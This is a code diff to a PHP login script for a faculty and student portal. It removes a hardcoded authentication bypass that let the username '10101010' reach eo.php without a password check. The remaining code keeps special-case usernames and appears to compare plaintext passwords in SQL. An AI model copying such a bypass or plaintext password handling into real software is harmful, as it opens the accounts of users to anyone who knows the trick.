@@ -17,18 +17,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $type = mysqli_real_escape_string($db, $_POST['type']);
     $myusername = mysqli_real_escape_string($db, $_POST['email']);
     $mypassword = mysqli_real_escape_string($db, $_POST['pass']);
-    if($myusername=="10101010" && $type=="faculty"){
-        echo "<script>
-        swal.fire({
-            icon: 'success',
-            title: 'Success',
-            text: 'Successful'
-        }).then(function() {
-            window.location = 'eo.php';
-        });
-      </script>";
-
-    }
+   
 
     if ($type == "faculty") {
         if ($myusername == "hroffice" || $myusername == "hr" || $myusername == "busadmin") {
@@ -44,7 +33,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $sql = "SELECT * FROM student WHERE sid = ? AND pass = ?";
         $stmt = $db->prepare($sql);
         $stmt->bind_param("ss", $myusername, $mypassword);
-    } 
+    }
     else {
         // Handle invalid type
         echo "<script>
